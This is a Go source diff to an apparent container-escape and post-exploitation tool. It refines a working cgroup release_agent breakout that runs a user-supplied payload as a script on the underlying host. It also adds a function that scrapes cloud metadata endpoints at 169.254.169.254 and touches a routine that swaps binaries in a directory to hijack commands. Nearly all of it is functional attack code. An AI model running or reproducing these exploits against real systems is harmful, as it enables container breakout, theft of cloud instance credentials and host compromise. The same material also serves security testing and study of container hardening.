@@ -13,6 +13,7 @@ import (
 	"math/rand"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -32,88 +33,136 @@ import (
 )
 
 func abuseCgroupPriv(payload string) {
-
 	if payload == "nil" {
 		fmt.Println("[-] Please provide a payload")
 		return
 	}
 	fmt.Println("[+] Attempting to abuse CGROUP Privileges")
-	containerHome, err := execShellCmd("sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab")
-	containerHome = strings.TrimSpace(containerHome)
-	if err != nil {
-		fmt.Println("[ERROR] In -> 'sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab'. ", err)
+	if *verbosePtr {
+		fmt.Println("[*] Extracting Container Home: sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab")
 	}
 
+	//Locate where the container is located on the underlying host
+	containerHome, err := execShellCmd("sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab")
+	if err != nil {
+		fmt.Println("[ERROR] Extracting Container Home  -> 'sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab'. ", err)
+	}
+
+	containerHome = strings.TrimSpace(containerHome)
+	if *verbosePtr {
+		fmt.Println("[*] Container Home Extracted: ", containerHome)
+	}
+
+	//Generate where the cgroup directories will live
 	randomCgroupPath := generateRandomString(6)
 	randomCgroupChild := generateRandomString(6)
 
-	cgroupFullPath := fmt.Sprintf("/tmp/cgrp%s/%s", randomCgroupPath, randomCgroupChild)
-	cgroupPartialPath := fmt.Sprintf("/tmp/cgrp%s", randomCgroupPath)
+	//This satisfies this command essentially "mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x"
+	cgroupFullPath := fmt.Sprintf("/etc/cgrp%s/%s", randomCgroupPath, randomCgroupChild)
+	cgroupPartialPath := fmt.Sprintf("/etc/cgrp%s", randomCgroupPath)
 
-	cgroupController := "cpu"
+	cgroupController := "memory"
 
 	if *verbosePtr {
 		fmt.Println("[*] CGROUP Location: ", cgroupFullPath)
 	}
-	_, err = execShellCmd("mkdir " + cgroupPartialPath)
+	out, err := execShellCmd("mkdir " + cgroupPartialPath)
 
 	if err != nil {
-		fmt.Println("[ERROR] In -> 'mkdir "+cgroupPartialPath+"'.", err)
+		fmt.Println("[ERROR] In Created Cgroup folder -> 'mkdir "+cgroupPartialPath+"'.", err, out)
 		exitCode = 1
 		return
 	}
 
-	_, err = execShellCmd("mount -t cgroup -o " + cgroupController + " cgroup " + cgroupPartialPath)
+	if *verbosePtr {
+		fmt.Println("[*] Created Cgroup folder:", cgroupPartialPath)
+	}
+
+	//mount -t cgroup -o rdma cgroup /tmp/cgrp
+	// "mount -t cgroup -o " + cgroupController + " cgroup " + cgroupPartialPath
+	mountCmd := fmt.Sprintf("mount -t cgroup -o %s cgroup %s", cgroupController, cgroupPartialPath)
+	_, err = execShellCmd(mountCmd)
 
 	if err != nil {
-		fmt.Println("[ERROR] In -> 'mount -t cgroup -o "+cgroupController+" cgroup "+cgroupPartialPath+"'.", err)
-		exitCode = 1
+		fmt.Println("[INFO] CGROUP may exist, attempting exploit regardless")
+		fmt.Printf("[ERROR] In Mounted CGROUP controller -> '%s'.%s\n", mountCmd, err)
+		// exitCode = 1
 		return
 	}
 
+	if *verbosePtr {
+		fmt.Println("[*] Mounted CGROUP controller: ", mountCmd)
+	}
+
+	// Create a folder for the child cgroup i.e mkdir /tmp/cgrp/x
 	_, err = execShellCmd("mkdir " + cgroupFullPath)
 
 	if err != nil {
-		fmt.Println("[ERROR] In -> 'mkdir "+cgroupFullPath+"'.", err)
+		fmt.Println("[ERROR] In Created Child CGROUP folder -> 'mkdir "+cgroupFullPath+"'.", err)
 		exitCode = 1
 		return
 	}
-	_, err = execShellCmd("echo 1 > " + cgroupFullPath + "/notify_on_release")
+
+	if *verbosePtr {
+		fmt.Println("[*] Created Child CGROUP folder:", cgroupPartialPath)
+	}
+
+	// echo 1 > /tmp/cgrp/x/notify_on_release
+	notifyOnReleaseCmd := fmt.Sprintf("echo 1 > %s/notify_on_release", cgroupFullPath)
+	_, err = execShellCmd(notifyOnReleaseCmd)
 
 	if err != nil {
-		fmt.Println("[ERROR] In -> 'echo 1 > "+cgroupFullPath+"/notify_on_release'. ", err)
+		fmt.Println("[ERROR] In Enabling CGROUP Notifications -> 'echo 1 > "+cgroupFullPath+"/notify_on_release'. ", err)
 		exitCode = 1
 		return
 	}
 
+	if *verbosePtr {
+		fmt.Println("[*] Enabled CGROUP Notifications:", notifyOnReleaseCmd)
+	}
+
+	// echo "$host_path/cmd" > /tmp/cgrp/release_agent
 	releaseAgentCommand := "echo " + containerHome + "/cmd > " + cgroupPartialPath + "/release_agent"
 	_, err = execShellCmd(releaseAgentCommand)
 
 	if err != nil {
-		fmt.Println("[ERROR] In -> '"+releaseAgentCommand+"'. ", err)
+		fmt.Println("[ERROR] In Created CMD Script -> '"+releaseAgentCommand+"'. ", err)
 		exitCode = 1
 		return
+	}
+
+	if *verbosePtr {
+		fmt.Println("[*] Created CMD Script:", releaseAgentCommand)
 	}
 
 	_, err = execShellCmd("echo '#!/bin/sh' > /cmd")
 
 	if err != nil {
-		fmt.Println("[ERROR] In -> 'echo '#!/bin/sh' > /cmd'. ", err)
+		fmt.Println("[ERROR] In Inserted shebang into CMD Script -> 'echo '#!/bin/sh' > /cmd'. ", err)
 		exitCode = 1
 		return
 	}
+
+	if *verbosePtr {
+		fmt.Println("[*] Inserted shebang into CMD Script: echo '#!/bin/sh' > /cmd")
+	}
+
 	payloadString := fmt.Sprintf("echo '%s > %s/output'>> /cmd", payload, containerHome)
 
 	if *verbosePtr {
-		fmt.Println("[*] Payload provided: ", payloadString)
+		fmt.Println("[*] Payload provided: ", payload)
 	}
 
 	_, err = execShellCmd(payloadString)
 
 	if err != nil {
-		fmt.Println("[ERROR] In -> '"+payloadString+"'. ", err)
+		fmt.Println("[ERROR] In Inserted payload into CMD script -> '"+payloadString+"'. ", err)
 		exitCode = 1
 		return
+	}
+
+	if *verbosePtr {
+		fmt.Println("[*] Inserted payload into CMD script: ", payloadString)
 	}
 
 	_, err = execShellCmd("chmod a+x /cmd")
@@ -124,12 +173,22 @@ func abuseCgroupPriv(payload string) {
 		return
 	}
 
-	_, err = execShellCmd("echo $$ > " + cgroupFullPath + "/cgroup.procs")
+	if *verbosePtr {
+		fmt.Println("[*] chmod'ing cmd script: chmod a+x /cmd")
+	}
+
+	// "echo $$ > " + cgroupFullPath + "/cgroup.procs"
+	addAndExecuteCmd := fmt.Sprintf("echo $$ > %s/cgroup.procs", cgroupFullPath)
+	_, err = execShellCmd(addAndExecuteCmd)
 
 	if err != nil {
-		fmt.Println("[ERROR] In -> 'echo $$ > "+cgroupFullPath+"/cgroup.procs'. ", err)
+		fmt.Printf("[ERROR] In  Executing, adding a process to CGROUP-> %s, %s\n", addAndExecuteCmd, err)
 		exitCode = 1
 		return
+	}
+
+	if *verbosePtr {
+		fmt.Println("[*] Executing, adding a process to CGROUP: ", addAndExecuteCmd)
 	}
 
 	fmt.Println("[*] The result of your command can be found in /output")
@@ -400,6 +459,53 @@ func performHttpGetRequest(url string) (int, error) {
 	return resp.StatusCode, nil
 }
 
+func scrapeMetadataEndpoints(endpointList string) {
+
+	if endpointList != "nil" {
+		endpoints, err := getLinesFromFile(endpointList)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		for _, target := range endpoints {
+			u, err := url.Parse(target)
+			if err != nil {
+				log.Fatal(err)
+			}
+			hostport := u.Port()
+			if len(hostport) == 0 {
+				hostport = "80"
+			}
+
+			resp, err := scrapeGcpMetadata(u.Hostname(), hostport)
+			if err != nil {
+				fmt.Println("[ERROR] ", err)
+			} else {
+				fmt.Println("[*] Output-> \n", resp)
+				exitCode = 1
+			}
+		}
+
+	} else {
+		resp, err := scrapeGcpMetadata("169.254.169.254", "80")
+		if err != nil {
+			fmt.Println("[ERROR] ", err)
+		} else {
+			fmt.Println("[*] Output-> \n", resp)
+			exitCode = 1
+		}
+
+		resp, err = scrapeGcpMetadata("169.254.169.254", "8080")
+		if err != nil {
+			fmt.Println("[ERROR] ", err)
+		} else {
+			fmt.Println("[*] Output-> \n", resp)
+			exitCode = 1
+		}
+	}
+
+}
+
 func checkMetadataServices(endpointList string) {
 	if endpointList != "nil" {
 		endpoints, err := getLinesFromFile(endpointList)
@@ -414,7 +520,11 @@ func checkMetadataServices(endpointList string) {
 		}
 
 	} else {
-		if queryEndpoint("http://169.254.169.254/") {
+		if queryEndpoint("http://169.254.169.254:80/") {
+			exitCode = 1
+		}
+
+		if queryEndpoint("http://169.254.169.254:8080/") {
 			exitCode = 1
 		}
 	}
@@ -633,7 +743,6 @@ func hijackDirectory(dir, command string) {
 				if *verbosePtr {
 					fmt.Println("[*] Error creating tmp file->", err)
 				}
-
 			}
 
 			err = execShellCmd2("rm", fmt.Sprintf("%s/%s", dir, file.Name()))
@@ -641,7 +750,6 @@ func hijackDirectory(dir, command string) {
 				if *verbosePtr {
 					fmt.Println("[*] Error deleting binary file->", err)
 				}
-
 			}
 
 			err = copyFile(file.Name(), fmt.Sprintf("%s/%s", dir, file.Name()))
@@ -657,7 +765,6 @@ func hijackDirectory(dir, command string) {
 				if *verbosePtr {
 					fmt.Println("[*] Error chmoding file->", err)
 				}
-
 			}
 			err = execShellCmd2("rm", file.Name())
 			if err != nil {
